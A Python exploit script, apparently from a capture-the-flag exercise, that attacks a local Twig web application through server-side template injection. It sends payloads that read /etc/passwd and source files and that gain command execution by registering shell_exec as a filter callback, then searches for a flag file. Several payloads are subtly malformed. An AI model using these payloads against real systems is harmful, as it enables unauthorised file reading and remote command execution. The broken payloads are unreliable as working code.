import requests
import urllib.parse
import re
from time import sleep

target_url = "http://127.0.0.1:8080"
headers = {'Content-Type': 'application/x-www-form-urlencoded'}

print("="*60)
print("TWIG SSTI EXPLOITATION ATTEMPTS")
print("="*60)

# Test 1: Verify SSTI still works
print("\n[+] Test 1: Verify basic SSTI ({{7*7}})")
payload = 'name={{7*7}}'
response = requests.post(target_url, data=payload, headers=headers)
print(f"Payload: {payload}")
print(f"Status: {response.status_code}")
print(f"Response contains '49': {'49' in response.text}")
print(f"Full response: {response.text}")

# Test 2: Try to read /etc/passwd (test file access)
print("\n[+] Test 2: Try reading /etc/passwd")
payload = 'name={%% for x in _self.env.getLoader().getSource(",../etc/passwd").split("\\n") %}{{x}}",{% endfor %}'
response = requests.post(target_url, data=payload, headers=headers)
print(f"Status: {response.status_code}")
if "root:" in response.text:
    print("SUCCESS - File read working!")
    print(f"Output: {response.text}")
else:
    print("No file content found")
    print(f"Response: {response.text}")

# Test 3: Alternative file reading method
print("\n[+] Test 3: Alternative file read method")
file_payload = 'name={{_self.env.getLoader().getSource("index.php")}}'
response = requests.post(target_url, data=file_payload, headers=headers)
print(f"Status: {response.status_code}")
print(f"Response length: {len(response.text)}B")
print(f"Contains '<?php': {'<?php' in response.text}")
if response.text:
    print(f"First 500 chars: {response.text[:500]}")
else:
    print("Empty response")

# Test 4: RCE attempt
print("\n[+] Test 4: RCE via registerUndefinedFilterCallback")
rce_payload = 'name={{_self.env.registerUndefinedFilterCallback("shell_exec")}}{{_self.env.getFilter("id")}}'
response = requests.post(target_url, data=rce_payload, headers=headers)
print(f"Status: {response.status_code}")
print(f"Response: {response.text}")

# Test 5: Check for flag.txt in various locations
flag_locations = ["flag.txt", "/flag.txt", "../flag.txt"]
for location in flag_locations:
    print(f"\n[+] Test: Reading {location}")
    payload = f'name={{_self.env.getLoader().getSource("{location}")}}'
    response = requests.post(target_url, data=payload, headers=headers)
    print(f"Status: {response.status_code}")
    
    flag_match = re.search(r'FLAG\{[^}]+\}', response.text)
    if flag_match:
        print(f"! FLAG FOUND: {flag_match.group(0)}")
        print(f"Full response: {response.text}")
        break
    elif response.text:
        print(f"Response: {response.text[:200]}")
    else:
        print("Empty response")

print("\n" + "="*60)
print("Testing complete")
print("="*60)
